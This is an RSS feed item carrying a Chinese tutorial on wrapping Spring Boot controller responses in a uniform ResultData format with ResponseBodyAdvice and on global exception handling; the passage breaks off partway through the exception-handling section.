<?xml version="1.0" encoding="UTF-8"?>
        <rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">
            <channel>
            <title>开发者头条</title>
            <link>http://toutiao.io/</link>
            <description></description>
<item>
<guid>4e1a5a25222c9f1fa43fa20c92e9eb2e</guid>
<title>Spring Boot 如何统一后端返回格式？老鸟们都是这样玩的</title>
<link>https://toutiao.io/k/290ect3</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;section data-tool=&quot;mdnice编辑器&quot; data-website=&quot;https://www.mdnice.com&quot; data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;p&gt;&lt;img class=&quot;rich_pages&quot; data-croporisrc=&quot;https://mmbiz.qpic.cn/mmbiz_png/PxMzT0Oibf4gOa4vJmA3Iz2aqv8C4e699G3oBEfic7adODd5HlOzXVxLgDu1sgreZv5vrd1SaRITNCaT17SVcT1w/0?wx_fmt=png&quot; data-cropx1=&quot;0&quot; data-cropx2=&quot;900.0000000000001&quot; data-cropy1=&quot;0&quot; data-cropy2=&quot;469.0140845070423&quot; data-galleryid=&quot;&quot; data-ratio=&quot;0.5211111111111111&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/PxMzT0Oibf4gOa4vJmA3Iz2aqv8C4e699qibG4OFemkoiaP7pAkgs87ibAeWW4KIwXA5Acia5xbOicQbkyHV38n5yicvA/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;900&quot;/&gt;&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;大家好，我是飘渺。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;今天我们来聊一聊在基于SpringBoot前后端分离开发模式下，如何&lt;span&gt;友好的&lt;/span&gt;返回统一的标准格式以及如何优雅的处理全局异常。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;首先我们来看看为什么要返回统一的标准格式？&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;为什么要对SpringBoot返回统一的标准格式&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;在默认情况下，SpringBoot的返回格式常见的有三种：&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;第一种：返回 String&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@GetMapping&lt;/span&gt;(&lt;span&gt;&quot;/hello&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; String &lt;span&gt;getStr&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;  &lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;hello,javadaily&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;此时调用接口获取到的返回值是这样：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;hello,javadaily&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;第二种：返回自定义对象&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@GetMapping&lt;/span&gt;(&lt;span&gt;&quot;/aniaml&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; Aniaml &lt;span&gt;getAniaml&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;  Aniaml aniaml = &lt;span&gt;new&lt;/span&gt; Aniaml(&lt;span&gt;1&lt;/span&gt;,&lt;span&gt;&quot;pig&quot;&lt;/span&gt;);&lt;br/&gt;  &lt;span&gt;return&lt;/span&gt; aniaml;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;此时调用接口获取到的返回值是这样：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;{&lt;br/&gt;  &lt;span&gt;&quot;id&quot;&lt;/span&gt;: &lt;span&gt;1&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;name&quot;&lt;/span&gt;: &lt;span&gt;&quot;pig&quot;&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;第三种：接口异常&lt;/span&gt;&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;@GetMapping(&lt;span&gt;&quot;/error&quot;&lt;/span&gt;)&lt;br/&gt;public int &lt;span&gt;&lt;span&gt;error&lt;/span&gt;&lt;/span&gt;(){&lt;br/&gt;    int i = 9/0;&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; i;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;此时调用接口获取到的返回值是这样：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;{&lt;br/&gt;  &lt;span&gt;&quot;timestamp&quot;&lt;/span&gt;: &lt;span&gt;&quot;2021-07-08T08:05:15.423+00:00&quot;&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;status&quot;&lt;/span&gt;: &lt;span&gt;500&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;error&quot;&lt;/span&gt;: &lt;span&gt;&quot;Internal Server Error&quot;&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;path&quot;&lt;/span&gt;: &lt;span&gt;&quot;/wrong&quot;&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;基于以上种种情况，如果你和前端开发人员联调接口她们就会很懵逼，由于我们没有给他一个统一的格式，前端人员不知道如何处理返回值。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;还有甚者，有的同学比如小张喜欢对结果进行封装，他使用了Result对象，小王也喜欢对结果进行包装，但是他却使用的是Response对象，当出现这种情况时我相信前端人员一定会抓狂的。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;所以我们项目中是需要定义一个统一的标准返回格式的。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;定义返回标准格式&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;一个标准的返回格式至少包含3部分：&lt;/p&gt;&lt;ol data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;status 状态值：由后端统一定义各种返回结果的状态码&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;message 描述：本次接口调用的结果描述&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;data 数据：本次返回的数据。&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;{&lt;br/&gt;  &lt;span&gt;&quot;status&quot;&lt;/span&gt;:&lt;span&gt;&quot;100&quot;&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;message&quot;&lt;/span&gt;:&lt;span&gt;&quot;操作成功&quot;&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;data&quot;&lt;/span&gt;:&lt;span&gt;&quot;hello,javadaily&quot;&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;当然也可以按需加入其他扩展值，比如我们就在返回对象中添加了接口调用时间&lt;/p&gt;&lt;ol start=&quot;4&quot; data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;timestamp: 接口调用时间&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;定义返回对象&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@Data&lt;/span&gt;&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;ResultData&lt;/span&gt;&amp;lt;&lt;span&gt;T&lt;/span&gt;&amp;gt; &lt;/span&gt;{&lt;br/&gt;  &lt;span&gt;/** 结果状态 ,具体状态码参见ResultData.java*/&lt;/span&gt;&lt;br/&gt;  &lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; status;&lt;br/&gt;  &lt;span&gt;private&lt;/span&gt; String message;&lt;br/&gt;  &lt;span&gt;private&lt;/span&gt; T data;&lt;br/&gt;  &lt;span&gt;private&lt;/span&gt; &lt;span&gt;long&lt;/span&gt; timestamp ;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;  &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;ResultData&lt;/span&gt; &lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;this&lt;/span&gt;.timestamp = System.currentTimeMillis();&lt;br/&gt;  }&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;  &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &amp;lt;T&amp;gt; &lt;span&gt;ResultData&amp;lt;T&amp;gt; &lt;span&gt;success&lt;/span&gt;&lt;span&gt;(T data)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    ResultData&amp;lt;T&amp;gt; resultData = &lt;span&gt;new&lt;/span&gt; ResultData&amp;lt;&amp;gt;();&lt;br/&gt;    resultData.setStatus(ReturnCode.RC100.getCode());&lt;br/&gt;    resultData.setMessage(ReturnCode.RC100.getMessage());&lt;br/&gt;    resultData.setData(data);&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; resultData;&lt;br/&gt;  }&lt;br/&gt;&lt;br/&gt;  &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &amp;lt;T&amp;gt; &lt;span&gt;ResultData&amp;lt;T&amp;gt; &lt;span&gt;fail&lt;/span&gt;&lt;span&gt;(&lt;span&gt;int&lt;/span&gt; code, String message)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;    ResultData&amp;lt;T&amp;gt; resultData = &lt;span&gt;new&lt;/span&gt; ResultData&amp;lt;&amp;gt;();&lt;br/&gt;    resultData.setStatus(code);&lt;br/&gt;    resultData.setMessage(message);&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; resultData;&lt;br/&gt;  }&lt;br/&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;定义状态码&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;public enum ReturnCode {&lt;br/&gt;    /**操作成功**/&lt;br/&gt;    RC100(100,&lt;span&gt;&quot;操作成功&quot;&lt;/span&gt;),&lt;br/&gt;    /**操作失败**/&lt;br/&gt;    RC999(999,&lt;span&gt;&quot;操作失败&quot;&lt;/span&gt;),&lt;br/&gt;    /**服务限流**/&lt;br/&gt;    RC200(200,&lt;span&gt;&quot;服务开启限流保护,请稍后再试!&quot;&lt;/span&gt;),&lt;br/&gt;    /**服务降级**/&lt;br/&gt;    RC201(201,&lt;span&gt;&quot;服务开启降级保护,请稍后再试!&quot;&lt;/span&gt;),&lt;br/&gt;    /**热点参数限流**/&lt;br/&gt;    RC202(202,&lt;span&gt;&quot;热点参数限流,请稍后再试!&quot;&lt;/span&gt;),&lt;br/&gt;    /**系统规则不满足**/&lt;br/&gt;    RC203(203,&lt;span&gt;&quot;系统规则不满足要求,请稍后再试!&quot;&lt;/span&gt;),&lt;br/&gt;    /**授权规则不通过**/&lt;br/&gt;    RC204(204,&lt;span&gt;&quot;授权规则不通过,请稍后再试!&quot;&lt;/span&gt;),&lt;br/&gt;    /**access_denied**/&lt;br/&gt;    RC403(403,&lt;span&gt;&quot;无访问权限,请联系管理员授予权限&quot;&lt;/span&gt;),&lt;br/&gt;    /**access_denied**/&lt;br/&gt;    RC401(401,&lt;span&gt;&quot;匿名用户访问无权限资源时的异常&quot;&lt;/span&gt;),&lt;br/&gt;    /**服务异常**/&lt;br/&gt;    RC500(500,&lt;span&gt;&quot;系统异常，请稍后重试&quot;&lt;/span&gt;),&lt;br/&gt;&lt;br/&gt;    INVALID_TOKEN(2001,&lt;span&gt;&quot;访问令牌不合法&quot;&lt;/span&gt;),&lt;br/&gt;    ACCESS_DENIED(2003,&lt;span&gt;&quot;没有权限访问该资源&quot;&lt;/span&gt;),&lt;br/&gt;    CLIENT_AUTHENTICATION_FAILED(1001,&lt;span&gt;&quot;客户端认证失败&quot;&lt;/span&gt;),&lt;br/&gt;    USERNAME_OR_PASSWORD_ERROR(1002,&lt;span&gt;&quot;用户名或密码错误&quot;&lt;/span&gt;),&lt;br/&gt;    UNSUPPORTED_GRANT_TYPE(1003, &lt;span&gt;&quot;不支持的认证模式&quot;&lt;/span&gt;);&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;    /**自定义状态码**/&lt;br/&gt;    private final int code;&lt;br/&gt;    /**自定义描述**/&lt;br/&gt;    private final String message;&lt;br/&gt;&lt;br/&gt;    ReturnCode(int code, String message){&lt;br/&gt;        this.code = code;&lt;br/&gt;        this.message = message;&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;    public int &lt;span&gt;&lt;span&gt;getCode&lt;/span&gt;&lt;/span&gt;() {&lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; code;&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    public String &lt;span&gt;&lt;span&gt;getMessage&lt;/span&gt;&lt;/span&gt;() {&lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; message;&lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;统一返回格式&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@GetMapping&lt;/span&gt;(&lt;span&gt;&quot;/hello&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; ResultData&amp;lt;String&amp;gt; &lt;span&gt;getStr&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt; &lt;span&gt;return&lt;/span&gt; ResultData.success(&lt;span&gt;&quot;hello,javadaily&quot;&lt;/span&gt;);&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;此时调用接口获取到的返回值是这样：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;{&lt;br/&gt;  &lt;span&gt;&quot;status&quot;&lt;/span&gt;: &lt;span&gt;100&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;message&quot;&lt;/span&gt;: &lt;span&gt;&quot;hello,javadaily&quot;&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;data&quot;&lt;/span&gt;: &lt;span&gt;null&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;timestamp&quot;&lt;/span&gt;: &lt;span&gt;1625736481648&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;httpStatus&quot;&lt;/span&gt;: &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这样确实已经实现了我们想要的结果，我在很多项目中看到的都是这种写法，在Controller层通过&lt;code&gt;ResultData.success()&lt;/code&gt;对返回结果进行包装后返回给前端。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;看到这里我们不妨停下来想想，这样做有什么弊端呢？&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;最大的弊端就是我们后面每写一个接口都需要调用&lt;code&gt;ResultData.success()&lt;/code&gt;这行代码对结果进行包装，重复劳动，浪费体力；&lt;br/&gt;&lt;br/&gt;而且还很容易被其他老鸟给嘲笑。&lt;/span&gt;&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/PxMzT0Oibf4gOa4vJmA3Iz2aqv8C4e699DGNhndOUYozjUs4rrYMKxpOEEkTiaW15gk9lPPwNPQo3hibG4fElxHPw/640?wx_fmt=png&quot; data-type=&quot;png&quot;/&gt;&lt;figcaption&gt;&lt;br/&gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;所以呢我们需要对代码进行优化，目标就是不要每个接口都手工制定&lt;code&gt;ResultData&lt;/code&gt;返回值。&lt;/p&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;高级实现方式&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;要优化这段代码很简单，我们只需要借助SpringBoot提供的&lt;code&gt;ResponseBodyAdvice&lt;/code&gt;即可。&lt;/p&gt;&lt;blockquote data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span&gt;“&lt;/span&gt;&lt;p&gt;ResponseBodyAdvice的作用：拦截Controller方法的返回值，统一处理返回值/响应体，一般用来统一返回格式，加解密，签名等等。&lt;/p&gt;&lt;span&gt;”&lt;/span&gt;&lt;/blockquote&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;先来看下&lt;code&gt;ResponseBodyAdvice&lt;/code&gt;的源码：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;interface&lt;/span&gt; &lt;span&gt;ResponseBodyAdvice&lt;/span&gt;&amp;lt;&lt;span&gt;T&lt;/span&gt;&amp;gt; &lt;/span&gt;{&lt;br/&gt;  &lt;span&gt;/**&lt;br/&gt;  * 是否支持advice功能&lt;br/&gt;  * true 支持，false 不支持&lt;br/&gt;  */&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;boolean&lt;/span&gt; &lt;span&gt;supports&lt;/span&gt;&lt;span&gt;(MethodParameter var1, Class&amp;lt;? extends HttpMessageConverter&amp;lt;?&amp;gt;&amp;gt; var2)&lt;/span&gt;&lt;/span&gt;;&lt;br/&gt;&lt;br/&gt;   &lt;span&gt;/**&lt;br/&gt;  * 对返回的数据进行处理&lt;br/&gt;  */&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;@Nullable&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;T &lt;span&gt;beforeBodyWrite&lt;/span&gt;&lt;span&gt;(@Nullable T var1, MethodParameter var2, MediaType var3, Class&amp;lt;? extends HttpMessageConverter&amp;lt;?&amp;gt;&amp;gt; var4, ServerHttpRequest var5, ServerHttpResponse var6)&lt;/span&gt;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;我们只需要编写一个具体实现类即可&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;/**&lt;br/&gt; * &lt;span&gt;@author&lt;/span&gt; jam&lt;br/&gt; * &lt;span&gt;@date&lt;/span&gt; 2021/7/8 10:10 上午&lt;br/&gt; */&lt;/span&gt;&lt;br/&gt;&lt;span&gt;@RestControllerAdvice&lt;/span&gt;&lt;br/&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;&lt;span&gt;class&lt;/span&gt; &lt;span&gt;ResponseAdvice&lt;/span&gt; &lt;span&gt;implements&lt;/span&gt; &lt;span&gt;ResponseBodyAdvice&lt;/span&gt;&amp;lt;&lt;span&gt;Object&lt;/span&gt;&amp;gt; &lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;@Autowired&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;private&lt;/span&gt; ObjectMapper objectMapper;&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; &lt;span&gt;supports&lt;/span&gt;&lt;span&gt;(MethodParameter methodParameter, Class&amp;lt;? extends HttpMessageConverter&amp;lt;?&amp;gt;&amp;gt; aClass)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;;&lt;br/&gt;    }&lt;br/&gt;&lt;br/&gt;    &lt;span&gt;@SneakyThrows&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;@Override&lt;/span&gt;&lt;br/&gt;    &lt;span&gt;&lt;span&gt;public&lt;/span&gt; Object &lt;span&gt;beforeBodyWrite&lt;/span&gt;&lt;span&gt;(Object o, MethodParameter methodParameter, MediaType mediaType, Class&amp;lt;? extends HttpMessageConverter&amp;lt;?&amp;gt;&amp;gt; aClass, ServerHttpRequest serverHttpRequest, ServerHttpResponse serverHttpResponse)&lt;/span&gt; &lt;/span&gt;{&lt;br/&gt;        &lt;span&gt;if&lt;/span&gt;(o &lt;span&gt;instanceof&lt;/span&gt; String){&lt;br/&gt;            &lt;span&gt;return&lt;/span&gt; objectMapper.writeValueAsString(ResultData.success(o));&lt;br/&gt;        }        &lt;br/&gt;        &lt;span&gt;return&lt;/span&gt; ResultData.success(o);&lt;br/&gt;    }&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;需要注意两个地方：&lt;/p&gt;&lt;ul data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;&lt;code&gt;@RestControllerAdvice&lt;/code&gt;注解&lt;/p&gt;&lt;p&gt;&lt;code&gt;@RestControllerAdvice&lt;/code&gt;是&lt;code&gt;@RestController&lt;/code&gt;注解的增强，可以实现三个方面的功能：&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ol class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;全局异常处理&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;全局数据绑定&lt;/section&gt;&lt;/li&gt;&lt;li&gt;&lt;section&gt;全局数据预处理&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;String类型判断&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;if&lt;/span&gt;(o &lt;span&gt;instanceof&lt;/span&gt; String){&lt;br/&gt;  &lt;span&gt;return&lt;/span&gt; objectMapper.writeValueAsString(ResultData.success(o));&lt;br/&gt;} &lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;这段代码一定要加，如果Controller直接返回String的话，SpringBoot是直接返回，故我们需要手动转换成json。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;经过上面的处理我们就再也不需要通过&lt;code&gt;ResultData.success()&lt;/code&gt;来进行转换了，直接返回原始数据格式，SpringBoot自动帮我们实现包装类的封装。&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@GetMapping&lt;/span&gt;(&lt;span&gt;&quot;/hello&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; String &lt;span&gt;getStr&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; &lt;span&gt;&quot;hello,javadaily&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;此时我们调用接口返回的数据结果为：&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;@GetMapping(&lt;span&gt;&quot;/hello&quot;&lt;/span&gt;)&lt;br/&gt;public String getStr(){&lt;br/&gt;  return &lt;span&gt;&quot;hello,javadaily&quot;&lt;/span&gt;;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;是不是感觉很完美，别急，还有个问题在等着你呢。&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/PxMzT0Oibf4gOa4vJmA3Iz2aqv8C4e699kLQhjyGc5xic06EVg7GH1ibETk09icl6qvkqDUObSz9U2Fpqnn5dBXz0Q/640?wx_fmt=png&quot; data-type=&quot;png&quot;/&gt;&lt;/figure&gt;&lt;h3 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;&lt;br/&gt;接口异常问题&lt;/span&gt;&lt;span/&gt;&lt;/h3&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;此时有个问题，由于我们没对Controller的异常进行处理，当我们调用的方法一旦出现异常，就会出现问题，比如下面这个接口&lt;/p&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;&lt;span&gt;@GetMapping&lt;/span&gt;(&lt;span&gt;&quot;/wrong&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; &lt;span&gt;error&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;br/&gt;    &lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;9&lt;/span&gt;/&lt;span&gt;0&lt;/span&gt;;&lt;br/&gt;    &lt;span&gt;return&lt;/span&gt; i;&lt;br/&gt;}&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;返回的结果为：&lt;/p&gt;&lt;figure data-tool=&quot;mdnice编辑器&quot;&gt;&lt;img data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/PxMzT0Oibf4gOa4vJmA3Iz2aqv8C4e699F4vXppP4LAnKTsuvSGEfsU3NulReBHdmsX4Vic8n1EeopTPL8OLwwJw/640?wx_fmt=png&quot; data-type=&quot;png&quot;/&gt;&lt;/figure&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;&lt;br/&gt;这显然不是我们想要的结果，接口都报错了还返回操作成功的响应码，前端看了会打人的。&lt;/p&gt;&lt;p data-tool=&quot;mdnice编辑器&quot;&gt;别急，接下来我们进入第二个议题，如何优雅的处理全局异常。&lt;/p&gt;&lt;h2 data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;span&gt;SpringBoot为什么需要全局异常处理器&lt;/span&gt;&lt;span/&gt;&lt;/h2&gt;&lt;ol data-tool=&quot;mdnice编辑器&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;section&gt;&lt;p&gt;不用手写try...catch，由全局异常处理器统一捕获&lt;/p&gt;&lt;p&gt;使用全局异常处理器最大的便利就是程序员在写代码时不再需要手写&lt;code&gt;try...catch&lt;/code&gt;了，前面我们讲过，默认情况下SpringBoot出现异常时返回的结果是这样：&lt;/p&gt;&lt;/section&gt;&lt;/li&gt;&lt;/ol&gt;&lt;pre data-tool=&quot;mdnice编辑器&quot;&gt;&lt;span/&gt;&lt;code&gt;{&lt;br/&gt;  &lt;span&gt;&quot;timestamp&quot;&lt;/span&gt;: &lt;span&gt;&quot;2021-07-08T08:05:15.423+00:00&quot;&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;status&quot;&lt;/span&gt;: &lt;span&gt;500&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;error&quot;&lt;/span&gt;: &lt;span&gt;&quot;Internal Server Error&quot;&lt;/span&gt;,&lt;br/&gt;  &lt;span&gt;&quot;path&quot;&lt;/span&gt;: 